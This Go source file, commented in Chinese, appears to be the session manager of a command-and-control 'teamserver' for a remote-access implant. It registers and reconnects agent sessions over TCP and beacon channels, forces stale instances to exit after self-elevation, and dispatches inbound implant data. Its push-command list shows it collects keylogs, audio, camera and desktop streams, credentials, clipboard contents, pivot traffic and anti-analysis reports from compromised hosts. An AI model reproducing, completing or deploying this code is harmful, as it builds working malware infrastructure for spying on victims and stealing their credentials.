package session

import (
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"time"

	"cleat/teamserver/internal/crypto"
	"cleat/teamserver/internal/eventbus"
	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/protocol"
	"cleat/teamserver/internal/store"
)

// HandlerFunc 命令处理函数(由 handlers 包注入)。
type HandlerFunc func(s *Session, cmd string, params map[string]interface{}, binary []byte)

// Manager 会话管理: accept + 身份注册/复用/防抖 + 命令分发 + 心跳清理。
// 承载会话状态机的核心逻辑, 状态落 store.Record。
type Manager struct {
	st    *store.Store
	bus   *eventbus.Hub
	cbox  *crypto.Box
	xbox  *crypto.X25519Box // TCP 通道 X25519
	mimic bool

	mu       sync.RWMutex
	sessions map[int]*Session // id -> 连接层; store.Record 是其状态

	// 动态监听器(独立于 sessions 表, 避免争用)
	listenMu  sync.Mutex
	listeners map[string]*listener

	handlers map[string]HandlerFunc
	pushCmds map[string]bool

	// denySince 记录各会话记录首次因防抖拒绝注册的时刻:
	// 同 machine_id 的注册被连续拒绝满一个防抖窗仍无法接管, 判定"活跃"信号来自
	// 注册者自身的身份路由 GET(旧实例已停拍), 允许接管。成功注册或会话删除时清除。
	denySince map[int]time.Time

	// 启动期经 SetPayloadResolver 注入(main.go), 运行期只读 —— 与 handlers 同一注入纪律。
	payloadResolver func(sid int, cmd string, params map[string]interface{}) ([]byte, error)
}

// InjectSessionForTest **仅测试使用**: 把手工构造的会话直接放进会话表。
// 生产代码禁止调用 —— 会话注册必须走 registerNew/bindRevivedRecord 的完整身份链路,
// 绕过即重现"匿名会话风暴"一族事故。
func (m *Manager) InjectSessionForTest(s *Session) {
	m.mu.Lock()
	m.sessions[s.ID()] = s
	m.mu.Unlock()
}

// NewManager 创建会话管理器。
func NewManager(st *store.Store, bus *eventbus.Hub, cbox *crypto.Box, xbox *crypto.X25519Box, mimic bool) *Manager {
	return &Manager{
		st:        st,
		bus:       bus,
		cbox:      cbox,
		xbox:      xbox,
		mimic:     mimic,
		sessions:  make(map[int]*Session),
		denySince: make(map[int]time.Time),
		listeners: make(map[string]*listener),
		handlers:  make(map[string]HandlerFunc),
		pushCmds: map[string]bool{
			CmdPoll: true, CmdEventReport: true, CmdHeartbeatPing: true,
			"KeylogData": true, "AudioData": true, "CameraStreamData": true,
			"DesktopStreamData": true, "TerminalOutput": true,
			"FileDownloadData": true, "FileDownloadError": true, "FileDownloadComplete": true,
			"FileUploadComplete": true, "FileUploadError": true,
			"PivotData": true, "PivotClose": true,
			"CredentialData": true, "AntiAnalysisReport": true, "ElevationReport": true,
			"DiscoveryReport": true, "ClipboardData": true, "FileChangeData": true,
		},
	}
}

// RegisterHandler 注册命令处理函数(handlers 包初始化时调用)。
func (m *Manager) RegisterHandler(cmd string, fn HandlerFunc) {
	m.handlers[cmd] = fn
}

// AcceptConn 接入新连接并启动消息循环(每连接一个 goroutine)。
// transport 为可选通道类型("tcp"/"ws"/"pipe"): 省略时按 "tcp" 兜底(长连接默认通道)。
// 采用可变参数而非新增必填形参, 是为保持既有调用点(含测试)零改动。
func (m *Manager) AcceptConn(conn *protocol.Conn, transport ...string) {
	defer logx.Guard("conn-loop") // G3: 每连接一个 goroutine, panic 不许带崩进程
	sess := New(conn, m.bus)
	sess.Record.Transport = transportOrDefault(transport, "tcp")
	logx.Printf("[+] 新连接 %s（%s）\n", conn.RemoteAddr().String(), sess.Record.Transport)
	m.runLoop(sess)
}

// runLoop 读取连接直到断开。
// 复用转交时把底层会话切换为旧会话, 同一 goroutine 继续读(否则复用后丢失读取循环,
// 后续命令响应将收不到)。
func (m *Manager) runLoop(sess *Session) {
	for {
		body, err := sess.Conn.ReadFrame()
		if err != nil {
			// 读超时(ReadDeadline 到点, A1-5)≠ 断连: 空闲会话没有入站帧是常态,
			// 继续读等下一帧; deadline 只负责消灭"发几个字节然后挂住"的恶意连接。
			// **防覆辙**: 若在此把超时当断连处理, 空闲 TCP 会话每 120s 被误杀一次。
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				continue
			}
			logx.Printf("[-] 会话 #%d 读取失败: %v\n", sess.ID(), err)
			if sess.Record.ID > 0 {
				sess.MarkOffline()
				m.removeSessionMap(sess.ID())
			}
			return
		}
		next, switched := sess.handleOne(body, m)
		if switched {
			sess = next // 复用 old: 连接已替换到 old, 本 goroutine 继续读
		}
	}
}

// ResolveIdentity 解析待定连接的首条消息身份(注册/复用)。
// 返回 (signedOver bool, err); signedOver=true 表示已复用旧连接, 调用方应结束本连接。
func (m *Manager) ResolveIdentity(s *Session, cmd string, msg map[string]interface{}) (bool, error) {
	switch cmd {
	case CmdFirstConnect:
		return m.registerNew(s, msg)
	case CmdHeartbeatPing:
		return m.reconnectExisting(s, msg)
	default:
		// 非注册帧抢先成为首帧: 此前走 registerAnonymous **铸造了一个匿名会话**(空参数,
		// 无 machine_id, 永不归并)。这既是 #99→#113(混合帧 session_id 解析失败 → 一帧一个
		// 匿名会话)的成因, 也是"服务端重启后每个在途请求造一个新会话"的成因 —— 两者都是
		// **身份解析失败退化成了铸造**(见 BeaconFrame 注释)。
		// 现在改为**下发重新注册信号**: Agent 清空本地 sid, 带 machine_id 重发 FirstConnect,
		// 由 registerNew 走 ByMachine 复用既有记录。
		logx.Printf("[-] 会话(pending) 首帧为非注册命令 %q, 拒绝匿名注册, 下发重新注册信号\n", cmd)
		_ = s.sendFrame(reregisterFrame(msgSessionID(msg)))
		return false, fmt.Errorf("首帧非注册命令 %q: 拒绝匿名注册", cmd)
	}
}

// registerNew 处理 FirstConnect: 全新注册或按 machine_id 复用旧会话。
func (m *Manager) registerNew(s *Session, msg map[string]interface{}) (bool, error) {
	params, _ := msg["params"].(map[string]interface{})
	keys := make([]string, 0, len(params))
	for k := range params {
		keys = append(keys, k)
	}
	logx.Printf("[*] 会话注册参数: %v\n", keys)
	machineID, _ := params["machine_id"].(string)
	elevatedOf := 0
	if v, ok := params["elevated_of"].(float64); ok && v > 0 {
		elevatedOf = int(v)
	}

	// 自提权: 标记被替换的旧会话
	if elevatedOf > 0 {
		if old := m.sessionByID(elevatedOf); old != nil {
			old.Record.ElevatedReplacedAt = time.Now()
			logx.Printf("[*] 会话 #%d 被提权实例替换\n", elevatedOf)
		}
	}

	// machine_id 复用路径
	if machineID != "" {
		if rec := m.st.ByMachine(machineID); rec != nil {
			// 会话接管三元校验之一: build_id 必须一致(注入与迁移设计)
			// 旧记录无 build_id(历史会话) → 放行; 新旧皆有但不一致 → 不接管(新会话注册)
			newBuild, _ := params["build_id"].(string)
			if rec.BuildID != "" && newBuild != "" && newBuild != rec.BuildID {
				fmt.Printf("[registerNew] build_id 不一致(rec=%s new=%s), 不接管按新会话注册\n",
					rec.BuildID, newBuild)
				// **必须带 machineID**(防覆辙, ): 曾传 "" → 新记录不进
				// machine map, map 永远指旧 build 记录 → 此后每次重启 build 校验
				// 都再失败一次, 会话 ID 无限增长。带 machineID 让 Put() 把 map
				// 更新到新记录, 旧 build 记录自然失去映射。
				return false, m.registerBrandNew(s, machineID, params)
			}
			// 残余实例: 自提权替换后旧实例重连 -> 引导退出
			if elevatedOf == 0 && !rec.ElevatedReplacedAt.IsZero() &&
				time.Since(rec.ElevatedReplacedAt) < 60*time.Second {
				logx.Printf("[elev] stale instance of session #%d, sending ExitProgram\n", rec.ID)
				if old := m.sessionByID(rec.ID); old != nil {
					_, _ = old.SendCommand(CmdExitProgram, nil) // stale 实例通知旧实例自退: 失败仅降级, 不中断迁移
				}
				if s.Conn != nil { // beacon 会话无长连接
					s.Conn.Close()
				}
				return false, fmt.Errorf("stale instance reconnecting")
			}
			// 防抖: 旧记录仍活跃时拒绝重复注册, 避免"注册→重连→互踢"死循环
			// (节拍合一 S4) 原值 5s 是 TCP 长连接语义的遗产。beacon 无长连接, LastSeen 随每次
			// GET/POST 更新, 空闲节拍默认 60s(Agent HeartbeatPolicy base) —— 5s 窗在 beacon 下
			// 形同虚设(两拍之间必然过期, 新实例几乎总能插队接管, 与旧实例互踢污染会话)。
			// 取 2×base 量级: 覆盖一个完整空闲节拍 + 抖动, 真正拦住"旧实例仍活跃时抢注册";
			// 旧实例停拍(死亡/离线)后, 新实例最迟 2 分钟可接管。对 TCP 只会更保守(心跳 30s),
			// 可接受。Agent 侧收到 DENY_BUSY 走既有退避, 不构成重连风暴。
			//
			// **同会话自接管豁免**(死投递复活,  真机实测): 帧内 sid(顶层优先,
			// 与 beacon frameSessionID 同序) == 命中记录 ID = 同一 Agent 经恢复通道重新
			// 注册 —— machine_id + build_id 校验已在前面通过, 不存在"互踢"(是它自己)。
			// 且复活场景下旧记录的 LastSeen 正被接管者自己的保活 GET 刷新, 防抖窗
			// 永不闭合, 不豁免即"复活后永久 DENY_BUSY"死锁。
			msgSID := 0
			if v, ok := msg["session_id"].(float64); ok && v > 0 {
				msgSID = int(v)
			} else if v, ok := params["session_id"].(float64); ok && v > 0 {
				msgSID = int(v)
			}
			rec.Lock()
			stillActive := !rec.Closed && time.Since(rec.LastSeen) < reRegisterDebounce
			rec.Unlock()
			selfTakeover := msgSID > 0 && msgSID == rec.ID
			// 死锁破除: 连续拒绝满一个完整窗仍无法接管 → "活跃"
			// 必是注册者自身 GET 刷新的假信号(独立旧实例在拍则其注册窗内本就走不到
			// 接管), 允许接管。真双开(同机双实例)本就被双开警告禁止, 接管后记录跟随
			// 最后写入者, 有界; 最迟 2 窗(默认 4 分钟)必出结果。
			persistedDeny := false
			if stillActive && !selfTakeover {
				m.mu.Lock()
				if firstDeny, seen := m.denySince[rec.ID]; !seen {
					m.denySince[rec.ID] = time.Now()
				} else if time.Since(firstDeny) >= reRegisterDebounce {
					persistedDeny = true
					delete(m.denySince, rec.ID)
				}
				m.mu.Unlock()
			}
			if stillActive && !selfTakeover && !persistedDeny {
				logx.Printf("[-] 会话 #%d 仍活跃, 拒绝重复连接(防抖)\n", rec.ID)
				deny := []byte(`{"status":"error","code":"DENY_BUSY","message":"session busy"}`)
				// HTS: beacon 会话 Conn 为 nil —— 之前直调 WriteFrame 会
				// nil 解引用 panic(HTTP 模式复现: 重复注册被防抖拒绝时崩)。
				// sendFrame 统一分流: TCP 写连接, beacon 进 outbox(下次 poll 捎带)。
				_ = s.sendFrame(deny)
				if s.Conn != nil {
					s.Conn.Close()
				}
				return false, fmt.Errorf("session busy")
			}
			// 走到接管/复用: 清除拒绝计时(本条记录的防抖纠纷已了结)
			m.mu.Lock()
			delete(m.denySince, rec.ID)
			m.mu.Unlock()
			// 复用旧会话
			if old := m.sessionByID(rec.ID); old != nil {
				if err := m.reuseSession(old, s, params); err != nil {
					return true, err
				}
				// 复用成功也必须下发确认帧: Agent 重连后 WaitSessionConfirm 靠
				// FirstConnect 确认才进入主循环; 缺确认 → 8s 超时判"假成功" →
				// Disconnect 重连风暴(实测 HTTPS: 复用注册收不到确认, 每次重连
				// 必超时, 叠加 WinHTTP session 被 Reset 后不再重建 → 永久失联)。
				// beacon 会话确认入 outbox, 由当前 POST 响应体捎带; TCP 直写。
				m.confirmSession(old, old.ID())
				return true, nil
			}
			// store 有记录但 session map 无(边缘): 视为新注册, 复用 rec.ID
			rec.Closed = false
			rec.RemoteIP = remoteAddrOf(s)
			rec.LastSeen = time.Now()
			// 必须重新 fillInfo: 旧库记录没有 pid/process_name/privilege,
			// 或 Agent 重编译后新增了字段, 否则这些值永远停留在旧数据
			fillInfo(rec, params)
			// 通道类型以本次连接为准(记录可能来自旧库 / 旧通道)
			if s.Record.Transport != "" {
				rec.Transport = s.Record.Transport
			}
			s.Record = rec
			m.mu.Lock()
			m.sessions[rec.ID] = s
			m.mu.Unlock()
			m.st.Put(rec) // 立即落盘, 避免重启后回退旧数据
			logx.Printf("[+] 会话 #%d 上线（machine_id 复用 · %s）\n", rec.ID, rec.RemoteIP)
			m.confirmSession(s, rec.ID)
			m.bus.PublishGlobal(eventbus.NewEvent(eventbus.EventSessionOnline, rec.ID, s.Info()))
			// → 必走本"store 记录激活"分支(reuseSession 仅覆盖 beacon 复用/半死连接)。
			// 激活成功即补派 pending, 与 reuseSession 尾部的 compensate 构成两条重连路径各自补派。
			m.compensate(s)
			return false, nil
		}
	}

	// 全新注册
	return false, m.registerBrandNew(s, machineID, params)
}

// registerBrandNew 全新会话注册。
func (m *Manager) registerBrandNew(s *Session, machineID string, params map[string]interface{}) error {
	id := m.st.NewID()
	rec := &store.Record{
		ID:        id,
		MachineID: machineID,
		RemoteIP:  remoteAddrOf(s),
		LastSeen:  time.Now(),
		Transport: s.Record.Transport, // 本次连接的通道类型(AcceptConn/NewBeaconSession 已写入)
	}
	fillInfo(rec, params)
	s.Record = rec
	m.st.Put(rec)
	m.mu.Lock()
	m.sessions[id] = s
	m.mu.Unlock()
	logx.Printf("[+] 会话 #%d 已激活（%s）\n", id, rec.RemoteIP)
	m.confirmSession(s, id)
	m.bus.PublishGlobal(eventbus.NewEvent(eventbus.EventSessionOnline, id, s.Info()))
	return nil
}

// reuseSession 复用旧会话: 更新旧会话的连接, 保持 ID/Info; 返回 error。
func (m *Manager) reuseSession(old *Session, newConn *Session, params map[string]interface{}) error {
	old.mu.Lock()
	old.Conn = newConn.Conn
	old.Record.RemoteIP = remoteAddrOf(newConn)
	// 通道类型以本次连接为准(重连可能换通道, 如 TCP 掉线后经 beacon 复用同一记录)
	if newConn.Record.Transport != "" {
		old.Record.Transport = newConn.Record.Transport
	}
	old.mu.Unlock()
	// TS-4: Closed/LastSeen 归 infoMu 收口 —— 不在 s.mu 内裸写(race 实锤:
	// manager.go:319/321 vs sendFrame:81); s.mu→infoMu 单向嵌套, 无死锁面。
	old.Record.Lock()
	old.Record.Closed = false
	old.Record.LastSeen = time.Now()
	old.Record.Unlock()
	// 更新主机信息(可能有变化)
	if params != nil {
		fillInfo(old.Record, params)
	}
	m.st.Put(old.Record) // 立即落盘, 避免重启后 RemoteIP/主机信息回退旧值
	// 让 newConn 的 goroutine 据以找到复用后的旧会话(handleOne 用 Record.ID 查表切换)
	newConn.Record.ID = old.ID()
	newConn.Record.SetClosed(true)
	logx.Printf("[+] 会话 #%d 重连成功(machine_id 复用) (%s)\n", old.ID(), old.Record.RemoteIP)
	m.bus.PublishGlobal(eventbus.NewEvent(eventbus.EventSessionOnline, old.ID(), old.Info()))
	m.mu.Lock()
	m.sessions[old.ID()] = old
	m.mu.Unlock()
	// 此前只有 SubmitTask(惰性)/handlePoll/BeaconGet 三个。TCP 断连的重连走
	// registerNew 激活分支(另有 compensate); 本处覆盖 map 仍持有旧 Session 的
	// beacon 复用/半死连接。不持任何锁(compensate 自持 dispatchMu), 与
	// SubmitTask 调用点的锁序一致。
	m.compensate(old)
	return nil
}

// reconnectExisting 处理心跳首条消息: 按 session_id 复用已离线会话。
func (m *Manager) reconnectExisting(s *Session, msg map[string]interface{}) (bool, error) {
	sid := msgSessionID(msg)
	old := m.sessionByID(sid)
	revived := false
	// 服务端重启后内存表为空, 但持久记录仍在 -> 先按记录复活, 再走正常复用
	if old == nil && sid > 0 {
		if rec := m.st.Get(sid); rec != nil {
			old = m.bindRevivedRecord(New(s.Conn, m.bus), rec, remoteAddrOf(s), false, s.Record.Transport)
			revived = true
		}
	}
	if old == nil {
		// 记录也没有 -> 绝不铸造(旧行为即匿名会话风暴的来源, 见 BeaconFrame 注释)
		logx.Printf("[-] 重连目标 #%d 不存在, 拒绝匿名注册, 下发重新注册信号\n", sid)
		_ = s.sendFrame(reregisterFrame(sid))
		return false, fmt.Errorf("重连目标 %d 不存在", sid)
	}
	if !revived {
		old.Record.Lock()
		online := !old.Record.Closed
		old.Record.Unlock()
		if online {
			// 目标仍在线: 同样不铸造 —— 交回注册判定(registerNew 的防抖/接管)
			logx.Printf("[-] 重连目标 #%d 仍在线, 拒绝匿名注册, 下发重新注册信号\n", sid)
			_ = s.sendFrame(reregisterFrame(sid))
			return false, fmt.Errorf("重连目标 %d 仍在线", sid)
		}
	}
	// 残余实例: 被提升实例替换后旧实例心跳 -> 引导退出
	if !old.Record.ElevatedReplacedAt.IsZero() &&
		time.Since(old.Record.ElevatedReplacedAt) < 60*time.Second {
		logx.Printf("[elev] stale instance heartbeat of #%d, ExitProgram\n", sid)
		_, _ = old.SendCommand(CmdExitProgram, nil) // stale 实例通知旧实例自退: 失败仅降级, 不中断迁移
		if s.Conn != nil {                          // beacon 会话无长连接(同 HTS  的 nil 解引用修复)
			s.Conn.Close()
		}
		return false, fmt.Errorf("stale instance heartbeat")
	}
	params, _ := msg["params"].(map[string]interface{})
	// 复用
	if err := m.reuseSession(old, s, params); err != nil {
		return false, err
	}
	return true, nil
}

// confirmSession 向 Agent 下发 session_id 确认。
func (m *Manager) confirmSession(s *Session, id int) {
	resp := map[string]interface{}{
		"status":     "success",
		"data":       map[string]interface{}{"session_id": id},
		"session_id": id,
	}
	body, _ := json.Marshal(resp)
	_ = s.sendFrame(body)
}

// Dispatch 分发 Agent 主动消息(S→A 命令处理 / 主动推送)。
func (m *Manager) Dispatch(s *Session, cmd string, msg map[string]interface{}, binary []byte) {
	// 心跳更新 LastSeen
	if cmd == CmdHeartbeatPing {
		s.Touch()
	}

	// pull 通道 poll: 弹出队首命令派发给 Agent
	if cmd == CmdPoll {
		m.handlePoll(s, msg)
		return
	}

	// 业务命令 / 主动推送交给 handlers 包
	if fn, ok := m.handlers[cmd]; ok {
		params, _ := msg["params"].(map[string]interface{})
		if params == nil {
			// Agent 部分主动推送(如 PivotData/PivotClose 上行)用 data 载荷, 非 params。
			// 与旧 Server msgPayload(优先 data)语义对齐, 兼容两类推送。
			if d, ok := msg["data"].(map[string]interface{}); ok {
				params = d
			}
		}
		fn(s, cmd, params, binary)
		return
	}

	// 未注册的主动推送 -> 忽略(不响应); 未知命令由 handlers 决定是否回 error
	if !m.pushCmds[cmd] {
		logx.Printf("[-] 会话 #%d 未知主动消息: %s\n", s.ID(), cmd)
	}
}
